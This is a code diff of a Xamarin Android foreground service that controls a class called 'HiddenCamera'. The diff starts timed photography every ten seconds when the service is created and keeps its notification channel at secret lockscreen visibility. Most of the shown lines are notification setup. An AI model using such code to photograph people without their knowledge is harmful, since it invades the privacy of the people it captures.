@@ -10,76 +10,71 @@ using Java.Util;
 using Android.Hardware;
 using Android.Hardware.Camera2;
 using System.Threading.Tasks;
+using Android.Support.V4.App;
+using Android.Runtime;
 
 namespace ServicesDemo3
 {
 	[Service]
 	public class ForegroundService : Service
 	{
-		static readonly string TAG = "ForegroundService";
-
         HiddenCamera _hiddenCamera;
 
-        public bool IsStarted { get; private set; }
+        public override void OnCreate()
+        {
+            base.OnCreate();
 
-		public override void OnCreate()
-		{
-			base.OnCreate();
-            Log.Info(TAG, "OnCreate: the service is initializing.");
-
-            var cameraManager = (CameraManager)GetSystemService(Context.CameraService);
+            var cameraManager = (CameraManager)GetSystemService(CameraService);
             _hiddenCamera = new HiddenCamera(cameraManager);
+            TimerPhotography(10);
         }
 
-		public override StartCommandResult OnStartCommand(Intent intent, StartCommandFlags flags, int startId)
-		{
-			if (intent.Action.Equals(Constants.ACTION_START_SERVICE))
-			{
-                // если сервис уже запущен
-				if (IsStarted)
-					Log.Info(TAG, "OnStartCommand: The service is already running.");
-				else 
-				{
-					Log.Info(TAG, "OnStartCommand: The service is starting.");
-					RegisterForegroundService();
-                    IsStarted = true;
+        public override IBinder OnBind(Intent intent)
+        {
+            return null;
+        }
 
-                    TimerPhotography(10);
+        [return: GeneratedEnum]
+        public override StartCommandResult OnStartCommand(Intent intent, [GeneratedEnum] StartCommandFlags flags, int startId)
+        {
+            if (intent.Action.Equals(Constants.ACTION_START_SERVICE))
+            {
+                Notification notification;
+                if (Build.VERSION.SdkInt >= BuildVersionCodes.O)
+                {
+                    CreateNotificationChannel();
+                    notification = CreateNotificationWithChannelId();
                 }
-			}
-			else if (intent.Action.Equals(Constants.ACTION_STOP_SERVICE))
-			{
-				Log.Info(TAG, "OnStartCommand: The service is stopping.");
-                StopForeground(true);
+                else
+                    notification = CreateNotification();
+
+                StartForeground(Constants.SERVICE_RUNNING_NOTIFICATION_ID, notification);
+            }
+            else if (intent.Action.Equals(Constants.ACTION_STOP_SERVICE))
                 _hiddenCamera.Stop();
 
-                // останавливаем сервис, если он был до этого запущен
-                StopSelf();
-				IsStarted = false;
-			}
-
-            // Говорим Android не перезапускать службу, если она уничтожена ради восстановления ресурсов
             return StartCommandResult.Sticky;
-		}
+        }
 
-		public override IBinder OnBind(Intent intent)
-		{
-			return null;
-		}
+        public override void OnDestroy()
+        {
+            base.OnDestroy();
+        }
 
-		public override void OnDestroy()
-		{
-			Log.Info(TAG, "OnDestroy: The started service is shutting down.");
+        private void CreateNotificationChannel()
+        {
+            var notificationChannel = new NotificationChannel
+                (
+                    Constants.NOTITFICATION_CHANNEL_ID,
+                    Constants.NOTIFICATION_CHANNEL_NAME,
+                    NotificationImportance.Default
+                );
+            notificationChannel.LockscreenVisibility = NotificationVisibility.Secret;
+            var notificationManager = (NotificationManager)GetSystemService(NotificationService);
+            notificationManager.CreateNotificationChannel(notificationChannel);
+        }
 
-            // Удаляем notification из строки состояния.
-            var notificationManager = (NotificationManager)GetSystemService(Context.NotificationService);
-            notificationManager.Cancel(Constants.SERVICE_RUNNING_NOTIFICATION_ID);
-
-            IsStarted = false;
-			base.OnDestroy();
-		}
-
-        private void RegisterForegroundService()
+        private Notification CreateNotification()
         {
             var notification = new Notification.Builder(this)
                     .SetContentTitle(Resources.GetString(Resource.String.app_name))
@@ -88,18 +83,19 @@ namespace ServicesDemo3
                     .SetOngoing(true)
                     .Build();
 
-            if (Build.VERSION.SdkInt >= BuildVersionCodes.O)
-                CreateNotificationChannel();
+            return notification;
+        }
 
-			StartForeground(Constants.SERVICE_RUNNING_NOTIFICATION_ID, notification);
-		}
-
-        private void CreateNotificationChannel()
+        private Notification CreateNotificationWithChannelId()
         {
-            var notificationChannel = new NotificationChannel("ID", "ChanelName", NotificationImportance.Default);
-            notificationChannel.LockscreenVisibility = NotificationVisibility.Secret;
-            var notificationManager = (NotificationManager)GetSystemService(NotificationService);
-            notificationManager.CreateNotificationChannel(notificationChannel);
+            var notification = new Notification.Builder(this, Constants.NOTITFICATION_CHANNEL_ID)
+               .SetContentTitle(Resources.GetString(Resource.String.app_name))
+               .SetContentText(Resources.GetString(Resource.String.notification_text))
+               .SetSmallIcon(Resource.Drawable.ic_stat_name)
+               .SetOngoing(true)
+               .Build();
+
+            return notification;
         }
 
         private void TimerPhotography(int seconds)
